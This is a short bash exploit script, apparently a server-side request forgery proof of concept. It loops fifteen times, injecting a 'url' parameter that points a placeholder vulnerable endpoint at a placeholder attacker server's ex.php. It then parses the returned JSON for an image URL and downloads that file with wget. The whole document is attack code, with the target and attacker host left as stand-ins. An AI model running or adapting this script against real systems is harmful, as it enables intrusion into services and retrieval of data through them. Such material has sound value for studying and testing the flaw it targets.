#!/bin/bash
for (( i=1; i <= 15; i++ ))
do
rand=$(( $RANDOM % 10000 + 1 ));
echo $rand;
url="<VulnerableURL>;url=http%3a//<AttackerServerDNSName>/ex.php%3ff$rand";
echo $url;
urlres=$(curl  -X 'GET' $url);
qwe=$(jq --raw-output '.image.url'<<<$urlres)
echo $qwe;
wget $qwe;
sleep 1;
done
